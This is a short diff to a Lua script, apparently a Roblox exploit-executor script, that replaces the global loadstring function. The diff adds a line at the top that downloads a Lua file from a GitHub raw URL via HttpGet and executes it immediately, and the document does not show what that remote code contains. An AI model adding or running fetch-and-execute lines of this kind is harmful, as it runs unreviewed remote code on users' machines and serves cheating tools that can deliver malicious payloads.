@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Krakles/main/ElgatoHub/Stuff.lua"))();
+
+
 local old = loadstring
 local tpc = 0
 getgenv().loadstring = function(a)
